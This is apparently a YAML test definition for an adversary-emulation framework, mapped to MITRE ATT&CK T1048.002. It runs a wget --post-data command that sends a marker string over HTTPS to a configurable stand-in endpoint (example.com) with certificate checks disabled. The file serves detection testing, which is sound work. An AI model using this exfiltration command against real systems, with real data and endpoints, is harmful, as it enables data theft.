api_version: "2.0"
name: Exfiltrate data as text over HTTPS using wget
description: |
    Exfiltrate data over HTTPS using wget --post-data method
args:
    - name: endpoint_domain
      type: string
      default: https://example.com/
uuid: 8bec51da-7a6d-4346-b941-51eca448c4b0
mitre:
    tactics:
        - 'TA0010: Exfiltration'
    techniques:
        - 'T1048: Exfiltration Over Alternative Protocol'
    subtechniques:
        - 'T1048.002: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol'
requirements:
    platforms:
        - os: linux
steps:
    - name: exfiltrate-data-as-text-over-https-using-wget
      inline: |
        wget --post-data="msg=AtomicTestT1048.002" --timeout=5 --no-check-certificate {{.Args.endpoint_domain}} --delete-after
      executor: sh
      cleanup:
        inline: ""
        executor: sh
